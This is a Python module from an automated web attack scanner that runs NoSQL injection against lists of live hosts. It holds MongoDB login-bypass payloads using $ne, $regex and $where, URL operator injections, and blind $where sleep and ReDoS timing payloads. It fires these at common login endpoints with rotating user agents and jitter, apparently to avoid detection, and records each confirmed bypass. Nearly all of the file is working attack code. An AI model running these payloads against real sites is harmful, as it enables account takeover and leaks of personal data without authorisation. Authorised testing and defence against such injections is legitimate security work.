#!/usr/bin/env python3
# modules/step27_nosql.py — NoSQL Injection V7 (UPGRADED)
# Added: blind timing-based injection, regex injection, JS where clause,
#        array operator bypass, type juggling, aggregation pipeline injection
# Source: Bug Bounty Bootcamp Ch19 — NoSQL methodology
# MilkyWay Intelligence | Author: Sharlix + M7AI

import os, re, json, time, urllib.request, urllib.parse, urllib.error
from core.utils import safe_read, count_lines

# ── Auth bypass payloads (Bug Bounty Bootcamp Ch19) ───────────────────────────
NOSQL_AUTH_BYPASS = [
    {"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}},
    {"username": {"$gt": ""},        "password": {"$gt": ""}},
    {"username": {"$regex": ".*"},   "password": {"$regex": ".*"}},
    {"username": {"$in": ["admin","administrator","root","superuser"]},
     "password": {"$ne": ""}},
    {"$where": "1==1"},
    {"$where": "function(){ return true; }"},
    # Nested operator bypass
    {"username": {"$not": {"$size": 0}}, "password": {"$not": {"$size": 0}}},
    # Type juggling (PHP loose comparison)
    {"username": True, "password": True},
    {"username": {"$exists": True}, "password": {"$exists": True}},
]

# ── URL-encoded operator injection ────────────────────────────────────────────
URL_OPERATORS = [
    "[$ne]=invalid",      "[$gt]=",
    "[$gte]=",            "[$regex]=.*",
    "[$in][]=admin",      "[$nin][]=x",
    "[$exists]=true",     "[$not][$size]=0",
    "[$where]=1==1",
]

# ── Blind timing payloads (MongoDB $where with sleep) ─────────────────────────
BLIND_TIMING_PAYLOADS = [
    # MongoDB JS sleep — confirmed if response takes > 5s
    {"$where": "function(){ sleep(5000); return true; }"},
    {"$where": "sleep(5000)||''==''"},
    # Regex ReDoS (catastrophic backtracking)
    {"username": {"$regex": "^(a+)+$"}},
    # Very long regex — server-side delay
    {"username": {"$regex": "a" * 100}},
]

# ── Data extraction via regex (blind char-by-char) ────────────────────────────
REGEX_EXTRACT_TEMPLATE = {"$regex": "^{char}"}
EXTRACT_CHARS = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ@._-"

# ── Auth endpoints to test ─────────────────────────────────────────────────────
AUTH_ENDPOINTS = [
    "/api/login", "/api/auth", "/api/user/login", "/login",
    "/auth/login", "/v1/login", "/api/v1/auth", "/api/v1/login",
    "/api/signin", "/signin", "/api/authenticate", "/api/token",
    "/api/session", "/account/login", "/user/auth",
]

# ── Aggregation injection (pipeline manipulation) ─────────────────────────────
AGGREGATION_PAYLOADS = [
    '{"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "data"}}',
    '{"$where": "1==1"}',
    '{"$match": {}}',
]

# ── Personal data indicators (confirms IDOR/data leak) ────────────────────────
PERSONAL_DATA_PATTERNS = [
    re.compile(r'"email"\s*:\s*"[^"@]+@[^"]+\.[^"]+"', re.I),
    re.compile(r'"password"\s*:\s*"[^"]+"', re.I),
    re.compile(r'"token"\s*:\s*"[A-Za-z0-9._\-]{20,}"', re.I),
    re.compile(r'"api_key"\s*:\s*"[^"]+"', re.I),
    re.compile(r'"role"\s*:\s*"admin"', re.I),
    re.compile(r'"is_admin"\s*:\s*true', re.I),
]


class NoSQLStep:
    def __init__(self, p):
        self.p = p
        self.log = p.log
        self.f = p.files

    def run(self):
        live  = safe_read(self.f.get("live_hosts",""))[:20]
        urls  = safe_read(self.f.get("urls",""))
        out   = self.f["nosql_results"]
        found = 0

        if not live:
            self.log.warn("NoSQL: no live hosts"); return

        self.log.info(f"NoSQL V7: {len(live)} hosts — auth bypass + blind timing + regex extract")
        auth_h = {}
        if getattr(self.p.args,"cookie",None):
            auth_h["Cookie"] = self.p.args.cookie

        for host in live:
            host = host.rstrip("/")

            # Phase 1: Auth bypass (JSON body)
            r = self._test_auth_bypass(host, auth_h, out)
            found += r

            # Phase 2: URL parameter operator injection
            host_urls = [u for u in urls if host.split("//")[-1] in u and "?" in u][:30]
            r = self._test_param_injection(host_urls, out)
            found += r

            # Phase 3: Blind timing-based
            r = self._test_blind_timing(host, auth_h, out)
            found += r

            # Phase 4: Regex data extraction (only if auth bypass found)
            # Skip — too slow for bulk, only run if explicitly confirmed

            self.p.bypass.jitter()

        self.log.success(f"NoSQL V7: {found} findings")

    # ── Phase 1: Auth bypass ──────────────────────────────────────────────────
    def _test_auth_bypass(self, host: str, auth_h: dict, out: str) -> int:
        found = 0
        for path in AUTH_ENDPOINTS:
            url = host + path
            # Probe first
            probe = self._post_json(url, {"username":"probe","password":"probe"}, auth_h)
            if not probe or probe.get("status",0) == 404:
                continue
            baseline_st   = probe.get("status",0)
            baseline_body = probe.get("body","")

            for payload in NOSQL_AUTH_BYPASS[:6]:
                resp = self._post_json(url, payload, auth_h)
                if not resp: continue

                st   = resp.get("status",0)
                body = resp.get("body","")

                # Confirmed: status flip OR token/data in response
                bypass_confirmed = (
                    (st == 200 and baseline_st in (401,403,422)) or
                    (st in (200,201) and any(p.search(body) for p in PERSONAL_DATA_PATTERNS)) or
                    ("token" in body.lower() and "token" not in baseline_body.lower())
                )

                if bypass_confirmed:
                    ai = self.p._ai
                    if ai:
                        verdict = ai._offline_fallback("NOSQL", body, str(payload))
                        if verdict.get("verdict") == "false_positive":
                            continue

                    detail = (f"MongoDB auth bypass: operator={list(payload.keys())[0]} "
                              f"status:{baseline_st}→{st}")
                    with open(out,"a") as f:
                        f.write(f"NOSQL_AUTH_BYPASS: {url} | {detail}\n")
                    self.p.add_finding("critical","NOSQL_AUTH_BYPASS",
                                       url, detail, "nosql-v7", payload=str(payload))
                    found += 1
                    break
        return found

    # ── Phase 2: URL parameter injection ─────────────────────────────────────
    def _test_param_injection(self, urls: list, out: str) -> int:
        found = 0
        for url in urls[:30]:
            try:
                parsed = urllib.parse.urlparse(url)
                qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            except Exception:
                continue

            baseline = self._get(url)
            if not baseline: continue
            b_len = len(baseline.get("body",""))

            for param in list(qs.keys())[:3]:
                for op in URL_OPERATORS[:6]:
                    op_key, op_val = (op.split("=",1) + [""])[:2]
                    test_qs = {k: list(v) for k,v in qs.items()}
                    test_qs[f"{param}{op_key}"] = [op_val]
                    test_url = urllib.parse.urlunparse(
                        parsed._replace(
                            query=urllib.parse.urlencode(test_qs, doseq=True)))

                    resp = self._get(test_url)
                    if not resp: continue

                    r_len = len(resp.get("body",""))
                    # Confirmed: response significantly different
                    if (resp.get("status",0) == 200 and r_len > b_len + 100):
                        detail = (f"NoSQL param injection: param={param} op={op_key} "
                                  f"response grew {r_len - b_len}b")
                        with open(out,"a") as f:
                            f.write(f"NOSQL_PARAM: {url} | {detail}\n")
                        self.p.add_finding("high","NOSQL_PARAM_INJECTION",
                                           url, detail, "nosql-v7", payload=op)
                        found += 1
                        break
        return found

    # ── Phase 3: Blind timing ─────────────────────────────────────────────────
    def _test_blind_timing(self, host: str, auth_h: dict, out: str) -> int:
        """
        Bug Bounty Bootcamp Ch19: JS sleep in $where = confirmed blind NoSQL.
        Baseline the response time, then measure delay.
        """
        found = 0
        for path in AUTH_ENDPOINTS[:5]:
            url = host + path

            # Baseline timing
            t0 = time.time()
            probe = self._post_json(url, {"username":"timer_test","password":"x"}, auth_h)
            baseline_t = time.time() - t0

            if not probe or probe.get("status",0) == 404:
                continue

            for payload in BLIND_TIMING_PAYLOADS[:2]:
                t1 = time.time()
                resp = self._post_json(url, payload, auth_h, timeout=12)
                elapsed = time.time() - t1

                # Confirmed: took 5x longer than baseline
                if elapsed >= 4.5 and elapsed > baseline_t * 3:
                    detail = (f"Blind NoSQL (timing): $where sleep injection "
                              f"delay={elapsed:.1f}s vs baseline={baseline_t:.2f}s")
                    with open(out,"a") as f:
                        f.write(f"NOSQL_BLIND: {url} | {detail}\n")
                    self.p.add_finding("critical","NOSQL_BLIND_TIMING",
                                       url, detail, "nosql-v7", payload=str(payload))
                    found += 1
                    break

        return found

    # ── Helpers ───────────────────────────────────────────────────────────────
    def _post_json(self, url, data, extra_h=None, timeout=8) -> dict:
        try:
            body = json.dumps(data).encode()
            hdrs = {"Content-Type":"application/json",
                    "User-Agent": self.p.bypass.ua(),
                    "Accept": "application/json"}
            if extra_h: hdrs.update(extra_h)
            req  = urllib.request.Request(url, data=body, headers=hdrs, method="POST")
            resp = urllib.request.urlopen(req, timeout=timeout)
            return {"status": resp.status,
                    "body":   resp.read(20000).decode("utf-8","ignore")}
        except urllib.error.HTTPError as e:
            try: b = e.read(2000).decode("utf-8","ignore")
            except: b = ""
            return {"status": e.code, "body": b}
        except Exception:
            return None

    def _get(self, url, timeout=8) -> dict:
        try:
            req  = urllib.request.Request(url,
                       headers={"User-Agent": self.p.bypass.ua()})
            resp = urllib.request.urlopen(req, timeout=timeout)
            return {"status": resp.status,
                    "body":   resp.read(20000).decode("utf-8","ignore")}
        except Exception:
            return None
